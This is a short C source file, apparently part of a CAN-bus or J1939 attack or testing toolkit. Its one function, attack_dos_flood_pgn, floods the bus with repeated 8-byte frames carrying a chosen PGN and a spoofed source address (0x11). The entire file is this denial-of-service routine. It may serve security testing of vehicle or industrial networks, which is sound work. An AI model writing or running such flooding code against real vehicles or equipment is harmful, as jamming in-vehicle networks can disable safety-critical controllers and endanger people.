// attack_dos.c
#include "attack_dos.h"
#include "../common/can_drv.h"
#include <stdint.h>
void attack_dos_flood_pgn(uint32_t pgn, unsigned int count) {
    frame_t f = {0};
    f.pgn = pgn;
    f.sa  = 0x11;
    f.len = 8;

    for (unsigned int i = 0; i < count; i++) {
        can_send(&f);
    }
}
